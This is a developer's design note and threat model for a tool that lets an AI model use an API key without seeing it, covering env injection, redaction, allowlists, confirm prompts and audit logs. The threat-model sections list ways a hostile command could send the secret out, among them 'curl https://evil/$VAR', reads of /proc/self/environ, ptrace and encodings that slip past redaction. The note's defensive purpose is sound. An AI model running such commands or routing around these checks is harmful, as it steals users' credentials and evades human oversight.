# `skey run` — use-without-see: pattern evaluation + threat model

Goal: let an AI model (or script) TRIGGER use of a secret — e.g. make a
Mistral API call — without being able to READ the plaintext. Assumes the
model can run arbitrary shell via pi tools, so **any plaintext in
stdout/env/args is exfiltratable by a malicious operator**.

## Patterns evaluated

(a) `senv run <name> [variant] --env VAR -- <cmd> [args]`
Injects the secret only into the child process environment, execs directly
(no shell, no `-c`), captures child stdout/stderr, redacts the secret (plus
base64 std/url/raw + URL-escaped forms) before forwarding, passes the exit
code through. **Implemented in Go (`senv/run.go`).** Chosen as the MVP:
small, composes with existing tools (`curl`, app CLIs), secret never in
argv/history/`ps` on the senv side.

(b) `senv call` / templated HTTPS proxy (senv performs the request, returns
redacted result). Strongest against malicious exfiltration — the model never
shares an address space, env, or fd with the secret; only whitelisted URL
templates + redacted response cross the boundary. But: per-API templates,
request/response schemas, mTLS/egress policy — a much bigger build.
**Recommended as the follow-up for high-value keys** (Mistral, etc.).
Spec sketch: `senv call mistral.chat --field prompt="$(...)"` with a
registry file mapping call-names to method/URL/secret-injection rules;
response filter redacts key-shaped substrings.

(c) FD-based passing (`--fd 3`, `SENV_FD=N`). Avoids env entirely (good
against `/proc/<pid>/environ` snoopers), but: child must cooperate (read fd),
fds are inheritable/sharable, and a malicious child reads the fd just as
easily as env. Marginal gain over (a) for much worse UX. **Not implemented**;
(a) covers the accidental-leak cases (c) targets, neither stops a malicious
child.

(d) Why (a) alone FAILS against a malicious command — and the constraints
that make it meaningful. A hostile `<cmd>` can trivially exfiltrate:
`echo $VAR` (blocked only by redaction, bypassable via `tr`/`base32`/chunking),
`curl https://evil/$VAR`, `/proc/self/environ`, `ptrace`, core dumps, swap.
Redaction is a **typo/airbag net, not a sandbox**: any encoding we didn't
enumerate (xxd, gzip+base64, char-splitting across writes) leaks. What makes
(a) meaningful anyway:
- **no shell**: exec directly (`exec.Command`, never `sh -c`), so the secret
  never appears in parent argv/`ps`/history;
- **confirm gate reused**: human approves EACH use on /dev/tty (default;
  `-y` only for trusted automation, and only on `run` — `get` has no bypass);
- **`--allowlist`**: basename match enforced BEFORE the secret is even
  fetched; deny-by-default for unknown binaries;
- **redaction on by default** (`--no-redact` is opt-out, audited);
- **audit log** (`audit.log` next to `index.json`, metadata only, never the
  secret): every run records time/name/variant/env/cmd-basename/exit;
- **secret never in argv**, only child env.

## Threat model (honest)

STOPS: accidental `printenv`/`env` dumps (redacted), shell-history/`ps`
leakage of the secret, casual `senv get`-and-scrollback reads, wrong-command
invocations (allowlist deny), unattended silent use (confirm gate), post-hoc
"who used what" questions (audit log).

DOES NOT STOP: a malicious command deliberately exfiltrating via network
(`curl evil/$VAR`), encoding tricks (chunked/rot13/custom base), `/proc`,
`ptrace`, debugger, memory scrape, or a compromised binary on PATH. There is
NO purely-userspace wrapper that survives `arbitrary-command + network`.
Real boundary requires, in combination: `--allowlist` pinned to hashed
binaries + no-shell + **network egress control** (proxy/firewall allowing
only the target API host) + **container/sandbox** (no /proc of others, no
ptrace, no raw sockets) + human confirm per use.

## Recommendation for pi

- Casual/low-risk: `senv run mistral prod --env MISTRAL_API_KEY -y -- curl
  -s https://api.mistral.ai/... -H "Authorization: Bearer $MISTRAL_API_KEY"`.
  Model sees only redacted output. Keep confirm ON (drop `-y`) when a human
  is present.
- Real boundary: run the above under pi's `--tools allowlist` (model may run
  `senv run ... -- <pinned-curl>` but NOT `senv get`) + container with
  egress limited to the API host. For unattended agents, prefer building (b).
- NEVER use `senv get` for agents (always-interactive by design); scope its tool policy to
  `senv run <specific-name> -- <specific-cmd>`. `get --yes` is rejected on purpose.

## Rust mirror

Not ported (nontrivial: process capture + redaction + keyring backends in
one change). Spec for `skey`: same argv grammar, same redaction forms,
same confirm helper (`confirm_access` exists there — reuse it), same audit
path (`dirs::config_dir()/skey/audit.log`), same exit passthrough. Keep
behavior identical so `skey run` works from either binary against the shared
OS-keychain store.
